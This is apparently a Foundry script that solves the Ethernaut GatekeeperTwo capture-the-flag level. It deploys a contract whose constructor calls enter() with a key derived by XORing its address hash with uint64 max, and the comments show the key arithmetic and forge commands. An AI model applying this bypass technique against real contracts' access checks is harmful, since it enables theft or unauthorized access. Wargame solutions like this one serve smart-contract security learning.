// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../src/GateKeeperTwo.sol";

contract Hack {
    constructor(GatekeeperTwo gatekeeperTwo) {
        bool success = gatekeeperTwo.enter(
            bytes8(
                uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                    type(uint64).max
            )
        );
        console.log("Hack is successfull", success);
    }
}
// 0x9DC119B8FF7BB6C3 // gate key

contract GateKeeperTwoHack is Script {
    GatekeeperTwo public gatekeeperTwo =
        GatekeeperTwo(0x3649efAEd133DE90ecbAe3F71145B4a2428b170b);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Hack(gatekeeperTwo);
        console.log("entrant", gatekeeperTwo.entrant());
        vm.stopBroadcast();
    }
}

// forge script script/GateKeeperTwo.s.sol -vv --tc GateKeeperTwoHack
// forge script script/GateKeeperTwo.s.sol -vv  --broadcast --tc GateKeeperTwoHack
// 0x9C476C291a5E1D23C8a8Fd760Afda2fa4abC4272 // This address

// 110001000111110111001100100011100000000100001000100100100111100  // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))
// 1001110111000001000110011011100011111111011110111011011011000011 // key
// 1111111111111111111111111111111111111111111111111111111111111111 // type(uint64).max
